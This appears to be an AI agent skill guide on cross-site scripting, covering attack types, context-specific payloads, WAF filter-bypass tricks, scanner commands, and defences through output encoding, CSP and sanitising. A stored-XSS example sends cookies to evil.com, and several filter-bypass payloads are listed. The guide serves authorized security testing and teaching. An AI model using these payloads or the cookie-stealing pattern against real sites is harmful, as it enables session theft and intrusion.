---
name: xss-detection
description: >-
  Detect, exploit, and prevent Cross-Site Scripting (XSS) vulnerabilities in
  web applications. Use when tasks involve testing for reflected, stored, or
  DOM-based XSS, building XSS payloads, bypassing WAF filters, implementing
  Content Security Policy, sanitizing user input, or auditing web applications
  for injection vulnerabilities. Covers detection, exploitation, and remediation.
license: Apache-2.0
compatibility: "Go 1.21+ for dalfox, Python 3.8+ for XSStrike"
metadata:
  author: terminal-skills
  version: "1.0.0"
  category: devops
  tags:
    - xss
    - web-security
    - injection
    - penetration-testing
    - owasp
---

# XSS Detection

## Overview

Find, prove, and fix Cross-Site Scripting vulnerabilities. XSS lets attackers inject scripts into web pages viewed by other users — stealing sessions, redirecting to phishing sites, or modifying page content.

## Instructions

### XSS Types

### Reflected XSS

The malicious script comes from the current HTTP request. The payload is in the URL or form submission and reflected back in the response:

```
Attack flow:
1. Attacker crafts URL: https://site.com/search?q=<script>alert(1)</script>
2. Victim clicks the link
3. Server includes the query in the response without sanitization
4. Browser executes the script in the victim's session
```

### Stored XSS

The payload is saved on the server (database, file, message) and served to other users:

```
Attack flow:
1. Attacker posts a comment: "Great article! <script>document.location='https://evil.com/steal?c='+document.cookie</script>"
2. Comment is stored in the database
3. Every user who views the page executes the script
4. Cookies/sessions are sent to the attacker's server
```

Stored XSS is more dangerous because it doesn't require tricking users into clicking a link.

### DOM-based XSS

The vulnerability is in client-side JavaScript, not the server response. The payload never reaches the server:

```javascript
// Vulnerable code — reads from URL fragment and writes to DOM
// URL: https://site.com/page#<img src=x onerror=alert(1)>
const hash = window.location.hash.substring(1);
document.getElementById('content').innerHTML = hash;  // XSS!

// The server never sees the # fragment
// Traditional server-side scanning won't detect this
```

### Detection

### Manual testing

Test every input point — URL parameters, form fields, headers, cookies:

```
Step 1: Inject a canary string to see where input appears in the response
  Input: test12345xss
  Search the response body for: test12345xss
  Note the context: inside HTML, inside an attribute, inside JavaScript, inside CSS

Step 2: Based on context, craft appropriate payload

  HTML body context:
    <p>Your search: test12345xss</p>
    Payload: <script>alert(1)</script>
    Payload: <img src=x onerror=alert(1)>

  HTML attribute context:
    <input value="test12345xss">
    Payload: " onfocus=alert(1) autofocus="
    Payload: "><script>alert(1)</script>

  JavaScript context:
    var x = "test12345xss";
    Payload: ";alert(1)//
    Payload: '-alert(1)-'

  URL/href context:
    <a href="test12345xss">
    Payload: javascript:alert(1)

Step 3: If basic payloads are blocked, try filter bypass techniques
```

### Automated scanning

```bash
# Using dalfox — specialized XSS scanner
# Install: go install github.com/hahwul/dalfox/v2@latest

# Scan a single URL with parameters
dalfox url "https://site.com/search?q=test" --skip-bav

# Scan multiple URLs from a file
dalfox file urls-with-params.txt --skip-bav --output results.txt

# Pipe from other tools
echo "https://site.com/search?q=test" | dalfox pipe

# Using XSStrike — Python-based XSS scanner
# Install: pip install xsstrike
python3 xsstrike.py -u "https://site.com/search?q=test"
python3 xsstrike.py -u "https://site.com/search?q=test" --fuzzer  # Fuzzing mode
```

### DOM XSS detection

DOM XSS requires analyzing JavaScript source code for dangerous patterns:

```javascript
// DANGEROUS SINKS — functions that execute or render content
// Look for these being called with user-controlled input:

document.write()              // Writes raw HTML
document.writeln()
element.innerHTML = ...       // Parses and renders HTML
element.outerHTML = ...
element.insertAdjacentHTML()
eval()                        // Executes JavaScript string
setTimeout(string)            // Executes if passed a string
setInterval(string)
Function(string)
$.html()                      // jQuery — same as innerHTML
$(user_input)                 // jQuery selector injection
window.location = ...         // Open redirect / javascript: URLs

// SOURCES — where user input comes from:
window.location.hash
window.location.search
window.location.href
document.URL
document.referrer
document.cookie
window.name
window.postMessage data
localStorage / sessionStorage
```

### Filter Bypass Techniques

When WAF or input filters block basic payloads:

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Tag alternatives (when <script> is blocked) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- Encoding tricks -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>  <!-- HTML entities -->
<a href="java&#115;cript:alert(1)">click</a>
<img src=x onerror=\u0061lert(1)>  <!-- Unicode escapes -->

<!-- Bypassing keyword filters -->
<img src=x onerror=ale+rt(1)>    <!-- String concatenation -->
<img src=x onerror=window['alert'](1)>  <!-- Bracket notation -->
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>  <!-- Base64 -->

<!-- Bypassing () filter -->
<img src=x onerror=alert`1`>  <!-- Template literals -->
<img src=x onerror=throw~onerror=alert,1>

<!-- Double encoding (if server decodes before WAF checks) -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Prevention

### Server-side output encoding

The primary defense — encode output based on context:

```python
# output_encoding.py
# Context-aware output encoding prevents XSS

import html
import json
import re
from markupsafe import escape  # Jinja2's escape function

def encode_html(value: str) -> str:
    """Encode for HTML body context.
    
    Converts: & < > " ' to HTML entities
    Use when inserting into: <p>{value}</p>
    """
    return html.escape(value, quote=True)

def encode_attribute(value: str) -> str:
    """Encode for HTML attribute context.
    
    Use when inserting into: <input value="{value}">
    Always quote attributes — unquoted attributes have more bypass vectors.
    """
    return html.escape(value, quote=True)

def encode_javascript(value: str) -> str:
    """Encode for JavaScript string context.
    
    Use when inserting into: var x = "{value}";
    Best practice: use JSON.dumps which handles all escaping.
    """
    return json.dumps(value)  # Handles \, ", newlines, etc.

def encode_url(value: str) -> str:
    """Encode for URL parameter context.
    
    Use when inserting into: <a href="/page?q={value}">
    """
    from urllib.parse import quote
    return quote(value, safe='')
```

### Content Security Policy (CSP)

CSP is the strongest defense against XSS — even if an attacker injects a script, the browser won't execute it:

```
# Strict CSP — blocks inline scripts and eval
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

# How nonce-based CSP works:
# Server generates a random nonce per request
# Only <script nonce="same-random-value"> executes
# Injected scripts without the nonce are blocked
```

```html
<!-- Server generates nonce per request -->
<script nonce="r4nd0m123">
  // This executes — nonce matches CSP header
  app.init();
</script>

<!-- Injected by attacker — blocked by CSP -->
<script>alert(1)</script>
<!-- Browser refuses to execute: no nonce attribute -->
```

### Input validation

Defense-in-depth — validate input even though output encoding is the primary defense:

```python
# input_validation.py
# Validate and sanitize user input as defense-in-depth

import bleach  # HTML sanitizer for cases where HTML input is needed

def sanitize_rich_text(html_input: str) -> str:
    """Sanitize user-provided HTML (e.g., blog comments with formatting).
    
    Allows safe tags and attributes, strips everything else.
    Use ONLY when you need to accept HTML input.
    For plain text, use output encoding instead.
    """
    allowed_tags = ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
    allowed_attrs = {'a': ['href', 'title']}  # No onclick, no style
    
    cleaned = bleach.clean(
        html_input,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True,              # Remove disallowed tags entirely
        protocols=['http', 'https']  # No javascript: URLs in href
    )
    return cleaned
```

## Examples

### Test a web application for XSS vulnerabilities

```prompt
Audit our web application for XSS vulnerabilities. Test all input points: search forms, user profile fields, comment sections, URL parameters, and HTTP headers (Referer, User-Agent). For each finding, show the injection context, the payload that triggers it, the XSS type (reflected/stored/DOM), and the impact. Provide remediation guidance specific to each finding.
```

### Implement CSP for an existing application

```prompt
Our Express.js application has no Content Security Policy. Implement a strict CSP with nonce-based script execution. The app uses inline scripts in 3 templates, loads Google Analytics and Stripe.js externally, and has inline styles in some components. Migrate all inline scripts to nonce-based, create the CSP middleware, and set up CSP violation reporting to catch issues before enforcing.
```

### Build an automated XSS testing pipeline

```prompt
Set up an automated XSS testing pipeline that runs on every PR. It should: 1) Spider the running application to discover all forms and URL parameters, 2) Test each input with context-appropriate payloads, 3) Check for DOM XSS by analyzing JavaScript for dangerous sink/source patterns, 4) Verify CSP headers are present and properly configured, 5) Report findings with severity ratings. Use dalfox for reflected/stored and a custom scanner for DOM-based.
```

## Guidelines

- Only test for XSS on applications you have explicit written authorization to test
- Use `alert(1)` or `alert(document.domain)` as proof-of-concept — never use actual cookie-stealing payloads against real users
- Stored XSS payloads persist in the database — coordinate with the target team to clean up after testing
- CSP is the strongest defense but is not a replacement for output encoding — implement both
- Context-aware encoding is critical: HTML encoding in a JavaScript context does not prevent XSS
- Always report XSS findings through responsible disclosure channels, never publicly
